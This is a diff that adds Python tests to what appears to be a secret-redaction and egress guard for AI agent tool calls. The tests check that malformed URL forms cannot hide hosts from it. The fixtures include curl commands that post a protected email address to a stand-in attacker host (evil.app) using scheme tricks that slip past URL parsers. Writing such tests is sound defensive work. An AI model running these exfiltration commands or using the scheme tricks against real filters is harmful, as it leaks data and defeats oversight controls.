@@ -253,3 +253,60 @@ def test_tabs_and_line_breaks_in_a_url_do_not_hide_the_host():
         assert json.loads(rehydrate_json_text(json.dumps(call), smap)) == call, repr(url)
     lines = {"content": f"url: https://{h}/x\nowner: {e}\n"}
     assert rehydrate_tool_call(lines, smap) == {"content": "url: https://db.example.mil/x\nowner: a.b@example.mil\n"}
+
+
+# A network scheme followed by ':' and any run of '/' or '\' (none included) is a URL start:
+# WHATWG `new URL()` (Node/Deno/Bun fetch, browsers) and curl read these hosts.
+SLASH_FORMS = ["http:/evil.app/", "http:///evil.app/", "http:evil.app/", "https:\\\\evil.app/",
+               "HTTP:\\/evil.app", "Https:/\\evil.app/", "ws:/\\evil.app/", "FTP:\\\\\\evil.app/",
+               "ht\ttp:/evil.app/", "http:\n//evil.app/", "https:/x.mil\n@evil.app/", "http:203.0.113.9/"]
+SCHEME_WORDS = ["if (u.protocol === 'https:') ssh {h}", 'scheme == "http:" and echo {e}',
+                "**HTTP:** see {e}", "rules:\n- host: {h}\n  http:\n    paths:\n    - path: /\n",
+                "ws: {e}", "news:{e}", "proto = HTTP: {e}"]
+
+
+def test_special_scheme_slashes_do_not_hide_the_host():
+    smap, e, h = _guarded()
+    for url in SLASH_FORMS:
+        s = f"curl -d {e} '{url}'"
+        assert smap.egress.is_outbound(s, smap), repr(s)
+        assert smap.rehydrate_tool(s) == s  # the text is never rewritten
+        call = {"url": url, "body": e}
+        assert rehydrate_tool_call(call, smap) == call, repr(url)
+        assert json.loads(rehydrate_json_text(json.dumps(call), smap)) == call, repr(url)
+    for url in (f"http:/{h}/x", f"https:\\\\{h}/x", "http:localhost:8080/", "HTTP:\\/127.0.0.1/"):
+        out = json.dumps(rehydrate_tool_call({"url": url, "body": e}, smap))
+        assert e not in out and h not in out, repr(url)
+    for t in SCHEME_WORDS:  # a scheme name that starts no host is not a URL
+        out = smap.rehydrate_tool(t.format(e=e, h=h))
+        assert e not in out and h not in out, repr(t)
+
+
+def _median_ms(fn) -> float:
+    import time
+
+    runs = []
+    for _ in range(3):
+        t0 = time.perf_counter()
+        fn()
+        runs.append((time.perf_counter() - t0) * 1000)
+    return sorted(runs)[1]
+
+
+def test_long_runs_decide_in_linear_time():
+    smap, e, _ = _guarded()
+    for unit in ("A", "a.b.c.", "aA1+.-", "A:", "@[", "http:a"):  # was O(n^2): 'A' * 50k took 11 s
+        text = (unit * 100_000)[: 100_000 - len(e) - 1] + " " + e
+        assert len(text) == 100_000
+        ms = _median_ms(lambda t=text: smap.tool_outbound(t))
+        assert ms < 50, (unit, ms)
+
+
+def test_oversized_call_is_outbound_without_parsing():
+    smap, e, h = _guarded()
+    head = f"ssh {h} {e} "
+    at_limit = head + "x" * (1_048_576 - len(head))
+    assert not smap.egress.is_outbound(at_limit, smap)
+    assert smap.egress.is_outbound(at_limit + "x", smap)
+    call = {"command": f"ssh {h}", "pad": "x" * 1_048_576}
+    assert rehydrate_tool_call(call, smap) == call
